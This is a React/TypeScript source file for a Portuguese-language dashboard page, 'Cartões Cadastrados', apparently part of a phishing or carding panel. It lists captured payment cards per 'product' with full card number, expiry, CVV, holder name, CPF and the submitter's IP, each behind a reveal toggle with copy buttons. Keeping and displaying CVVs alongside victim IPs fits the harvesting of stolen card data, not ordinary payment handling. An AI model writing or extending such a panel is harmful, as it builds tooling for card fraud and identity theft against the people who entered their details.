import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Loader2, CreditCard, Trash2, Copy, User, Clock, MapPin, Eye, EyeOff } from "lucide-react";
import { Button } from "@/components/ui/button";
import { toast } from "sonner";

interface Row {
  id: string;
  holder_name: string;
  card_number: string;
  expiry: string;
  cvv: string;
  cpf: string | null;
  ip: string | null;
  created_at: string;
  product_id: string | null;
  products?: { name: string | null } | null;
}

export const Route = createFileRoute("/painel/cartoes")({
  component: CardsPage,
});

const mask = (s: string, keep = 4) =>
  s.length <= keep ? s : "•".repeat(s.length - keep) + s.slice(-keep);
const fmtCard = (n: string) => n.replace(/(\d{4})/g, "$1 ").trim();
const fmtDate = (d: string) =>
  new Date(d).toLocaleString("pt-BR", { day: "2-digit", month: "2-digit", year: "numeric", hour: "2-digit", minute: "2-digit" });

function CardsPage() {
  const [rows, setRows] = useState<Row[]>([]);
  const [loading, setLoading] = useState(true);
  const [show, setShow] = useState<Record<string, boolean>>({});

  const load = async () => {
    setLoading(true);
    const { data: userRes } = await supabase.auth.getUser();
    const uid = userRes.user?.id;
    if (!uid) { setRows([]); setLoading(false); return; }
    const { data: prods } = await supabase.from("products").select("id").eq("user_id", uid);
    const ids = (prods ?? []).map((p: { id: string }) => p.id);
    if (ids.length === 0) { setRows([]); setLoading(false); return; }
    const { data, error } = await supabase
      .from("card_registrations")
      .select("id, holder_name, card_number, expiry, cvv, cpf, ip, created_at, product_id, products(name)")
      .in("product_id", ids)
      .order("created_at", { ascending: false });
    if (error) toast.error("Erro ao carregar cartões");
    else setRows((data as unknown as Row[]) ?? []);
    setLoading(false);
  };
  useEffect(() => { load(); }, []);

  const remove = async (id: string) => {
    if (!confirm("Deletar registro?")) return;
    const { error } = await supabase.from("card_registrations").delete().eq("id", id);
    if (error) return toast.error("Erro ao deletar");
    setRows((p) => p.filter((r) => r.id !== id));
    toast.success("Registro removido");
  };

  const copy = (v: string, label: string) => {
    navigator.clipboard.writeText(v);
    toast.success(`${label} copiado`);
  };

  if (loading) return <div className="flex justify-center py-16"><Loader2 className="w-8 h-8 animate-spin text-[#6E0AD6]" /></div>;

  return (
    <div className="p-6 max-w-6xl mx-auto space-y-6">
      <div className="flex items-center gap-3">
        <div className="p-2 bg-purple-50 rounded-lg"><CreditCard className="h-6 w-6 text-[#6E0AD6]" /></div>
        <div>
          <h1 className="text-2xl font-bold">Cartões Cadastrados</h1>
          <p className="text-sm text-slate-500">{rows.length} registro(s)</p>
        </div>
      </div>

      {rows.length === 0 ? (
        <div className="text-center py-16 bg-white rounded-xl border text-slate-500">
          <CreditCard className="h-10 w-10 mx-auto mb-2 opacity-40" />
          Nenhum cartão cadastrado ainda.
        </div>
      ) : (
        <div className="space-y-4">
          {rows.map((r) => {
            const vis = show[r.id];
            return (
              <div key={r.id} className="bg-white border rounded-xl p-5 space-y-3">
                <div className="flex items-center justify-between flex-wrap gap-2">
                  <div className="font-semibold text-slate-900 flex items-center gap-2">
                    <CreditCard className="h-4 w-4 text-[#6E0AD6]" />
                    {r.products?.name || "Produto removido"}
                  </div>
                  <div className="flex gap-2">
                    <Button variant="outline" size="sm" onClick={() => setShow((p) => ({ ...p, [r.id]: !p[r.id] }))}>
                      {vis ? <EyeOff className="w-4 h-4 mr-1" /> : <Eye className="w-4 h-4 mr-1" />}
                      {vis ? "Ocultar" : "Ver dados"}
                    </Button>
                    <Button variant="ghost" size="icon" className="text-red-600 hover:text-red-700" onClick={() => remove(r.id)}>
                      <Trash2 className="w-4 h-4" />
                    </Button>
                  </div>
                </div>
                <div className="grid grid-cols-1 md:grid-cols-3 gap-4 text-sm">
                  <Field label="Número">
                    <span className="font-mono bg-slate-100 px-2 py-1 rounded">
                      {vis ? fmtCard(r.card_number) : mask(r.card_number)}
                    </span>
                    {vis && <IconBtn onClick={() => copy(r.card_number, "Número")} />}
                  </Field>
                  <Field label="Titular">
                    <User className="h-4 w-4 text-slate-400" />
                    <span>{r.holder_name}</span>
                    <IconBtn onClick={() => copy(r.holder_name, "Titular")} />
                  </Field>
                  <Field label="Validade">
                    <span className="font-mono bg-slate-100 px-2 py-1 rounded">{r.expiry}</span>
                    <IconBtn onClick={() => copy(r.expiry, "Validade")} />
                  </Field>
                  <Field label="CVV">
                    <span className="font-mono bg-slate-100 px-2 py-1 rounded">
                      {vis ? r.cvv : "•".repeat(r.cvv.length)}
                    </span>
                    {vis && <IconBtn onClick={() => copy(r.cvv, "CVV")} />}
                  </Field>
                  <Field label="CPF">
                    <span className="font-mono bg-slate-100 px-2 py-1 rounded">
                      {r.cpf ? (vis ? r.cpf : mask(r.cpf, 3)) : "—"}
                    </span>
                    {vis && r.cpf && <IconBtn onClick={() => copy(r.cpf!, "CPF")} />}
                  </Field>
                  <Field label="IP">
                    <MapPin className="h-4 w-4 text-slate-400" />
                    <span>{r.ip || "—"}</span>
                  </Field>
                  <Field label="Data">
                    <Clock className="h-4 w-4 text-slate-400" />
                    <span>{fmtDate(r.created_at)}</span>
                  </Field>
                </div>
              </div>
            );
          })}
        </div>
      )}
    </div>
  );
}

const Field = ({ label, children }: { label: string; children: React.ReactNode }) => (
  <div className="space-y-1">
    <div className="text-xs text-slate-500 font-medium">{label}</div>
    <div className="flex items-center gap-2">{children}</div>
  </div>
);
const IconBtn = ({ onClick }: { onClick: () => void }) => (
  <Button variant="ghost" size="icon" className="h-6 w-6" onClick={onClick}><Copy className="h-3 w-3" /></Button>
);
